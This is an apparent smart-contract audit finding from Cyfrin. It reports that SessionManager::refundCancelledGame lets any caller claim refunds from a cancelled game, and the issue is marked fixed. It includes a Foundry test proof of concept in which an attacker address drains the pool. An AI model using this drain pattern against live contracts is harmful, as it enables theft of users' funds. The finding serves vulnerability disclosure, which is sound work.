---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-01-27-cyfrin-majority-protocol-v2-0-0-1
ingested_at: '2026-08-16T05:02:10Z'
protocol_category: []
published_at: '2026-01-27T00:00:00Z'
related_swc: []
severity: Critical
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-01-27-cyfrin-majority-protocol-v2.0.md
tags:
- firm:cyfrin
- report:2026-01-27-cyfrin-majority-protocol-v2-0
title: Attacker can drain all tokens from cancelled game since `SessionManager::refundCancelledGame`
  doesn't validate caller actually joined the game
vuln_class: []
---

# Attacker can drain all tokens from cancelled game since `SessionManager::refundCancelledGame` doesn't validate caller actually joined the game

_Section severity (from Solodit section header): Critical_  
_Audit firm: Cyfrin_  
_Source report: [2026-01-27-cyfrin-majority-protocol-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-01-27-cyfrin-majority-protocol-v2.0.md)_

---

**Description:** Attacker can drain all tokens from cancelled game since `SessionManager::refundCancelledGame` doesn't validate caller actually joined the game.

**Impact:** Any cancelled game can be completely drained of tokens by a permissionless attacker.

**Proof of Concept:** Add test to `SessionManagerLeaveGame.t.sol`:
```solidity
function test_attackerDrainsCancelledGame() public {
    // create game
    _createGame();

    // contestant joins
    vm.startPrank(contestants[0]);
    TestUSDC(usdc).approve(address(sessionManager), 10 ether);
    sessionManager.joinGame(1);

    // game is cancelled
    vm.stopPrank();
    sessionManager.cancelGame(1);
    vm.warp(block.timestamp + (type(uint256).max - block.timestamp));

    // attacker who never joined gets a refund they don't deserve
    address attacker = address(0x1337);
    vm.startPrank(attacker);
    sessionManager.refundCancelledGame(1);
    vm.stopPrank();

    // attacker can repeat this using different addresses
    // which all get a refund even though they never joined
    // the game, until the tokens have been totally drained

    // attacker has drained all the tokens
    assertEq(TestUSDC(usdc).balanceOf(attacker), 10 ether);
    assertEq(TestUSDC(usdc).balanceOf(address(sessionManager)), 0 ether);
    (,,,, uint256 totalCollectedAmount, address token, bool feesPaid) = sessionManager.gamePools(1);
    assertEq(totalCollectedAmount, 0 ether);
    assertEq(token, usdc);
    assertEq(feesPaid, false);

    // user who actually joined game can't get refund as
    // tokens have been drained
    vm.expectRevert(); // NotEnoughFunds(0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, 0)]
    vm.startPrank(contestants[0]);
    sessionManager.refundCancelledGame(1);
    vm.stopPrank();
}
```

**Recommended Mitigation:** Only allow users who joined a game to claim refunds.

**Majority Games:**
Fixed in commit [7692203](https://github.com/Engage-Protocol/engage-protocol/commit/7692203e579204d829bbb558716a5c8637ac2ef5).

**Cyfrin:** Verified.
